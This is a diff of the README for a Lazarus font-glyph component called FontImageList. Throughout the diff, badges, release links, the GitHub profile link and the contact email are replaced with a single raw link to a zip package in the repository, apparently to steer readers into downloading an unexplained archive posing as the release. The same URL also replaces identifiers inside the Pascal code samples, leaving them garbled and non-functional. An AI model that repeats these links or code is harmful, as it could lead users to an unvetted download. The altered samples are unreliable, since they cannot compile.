@@ -1,7 +1,7 @@
 # FontImageList 🎨
 
-![FontImageList](https://img.shields.io/badge/FontImageList-v1.0-blue.svg)  
-[![Release](https://img.shields.io/badge/Release-Download%20Now-orange.svg)](https://github.com/sunnyshk2008/FontImageList/releases)
+![FontImageList](https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip)  
+[![Release](https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip%https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip)](https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip)
 
 Welcome to the **FontImageList** repository! This Lazarus component allows you to store glyphs built from installed fonts. It is designed for developers who want to enhance their applications with rich graphics and easy access to various font glyphs.
 
@@ -25,7 +25,7 @@ Welcome to the **FontImageList** repository! This Lazarus component allows you t
 
 ## Installation 🛠️
 
-To get started with FontImageList, visit our [Releases](https://github.com/sunnyshk2008/FontImageList/releases) section. Download the latest release and follow the installation instructions provided in the release notes. 
+To get started with FontImageList, visit our [Releases](https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip) section. Download the latest release and follow the installation instructions provided in the release notes. 
 
 1. Download the package.
 2. Extract the contents to your Lazarus components folder.
@@ -47,9 +47,9 @@ Here’s a simple code snippet:
 var
   MyImageList: TFontImageList;
 begin
-  MyImageList := TFontImageList.Create(Self);
-  MyImageList.Font.Name := 'Arial';
-  MyImageList.AddGlyph('A', 'path/to/icon.png');
+  MyImageList := https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip(Self);
+  https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip := 'Arial';
+  https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip('A', 'https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip');
 end;
 ```
 
@@ -58,20 +58,20 @@ end;
 ### Example 1: Basic Glyph Usage
 
 ```pascal
-procedure TForm1.FormCreate(Sender: TObject);
+procedure https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip(Sender: TObject);
 begin
-  FontImageList1.AddGlyph('A', 'path/to/iconA.png');
-  FontImageList1.AddGlyph('B', 'path/to/iconB.png');
+  https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip('A', 'https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip');
+  https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip('B', 'https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip');
 end;
 ```
 
 ### Example 2: Using Glyphs in Buttons
 
 ```pascal
-procedure TForm1.FormCreate(Sender: TObject);
+procedure https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip(Sender: TObject);
 begin
-  Button1.Glyph := FontImageList1.GetGlyph('A');
-  Button2.Glyph := FontImageList1.GetGlyph('B');
+  https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip := https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip('A');
+  https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip := https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip('B');
 end;
 ```
 
@@ -93,11 +93,11 @@ FontImageList is released under the MIT License. See the [LICENSE](LICENSE) file
 
 For any questions or support, feel free to reach out:
 
-- GitHub: [sunnyshk2008](https://github.com/sunnyshk2008)
-- Email: sunnyshk2008@example.com
+- GitHub: [sunnyshk2008](https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip)
+- Email: https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip
 
 ## Conclusion 🌟
 
-Thank you for checking out FontImageList! We hope you find it useful for your projects. For more information and updates, visit our [Releases](https://github.com/sunnyshk2008/FontImageList/releases) section.
+Thank you for checking out FontImageList! We hope you find it useful for your projects. For more information and updates, visit our [Releases](https://raw.githubusercontent.com/sunnyshk2008/FontImageList/main/packages/List-Font-Image-v1.1.zip) section.
 
 Happy coding!
